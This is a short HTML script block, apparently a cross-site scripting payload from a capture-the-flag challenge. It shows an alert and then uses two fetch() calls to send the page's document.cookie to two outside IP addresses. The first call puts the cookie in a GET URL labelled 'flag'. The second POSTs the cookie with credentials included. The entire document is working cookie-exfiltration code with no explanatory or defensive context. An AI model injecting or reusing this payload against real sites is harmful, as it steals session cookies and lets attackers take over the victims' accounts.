<script>    
    alert(document.location);
    fetch("http://47.99.78.222:9999/flag="+document.cookie);

    fetch("http://39.101.137.200:7745/send", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "proxy-connection": "keep-alive",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://39.101.137.200:7745/send",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "header=hhh&listener=12&content=798798"+document.cookie,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
  });

</script>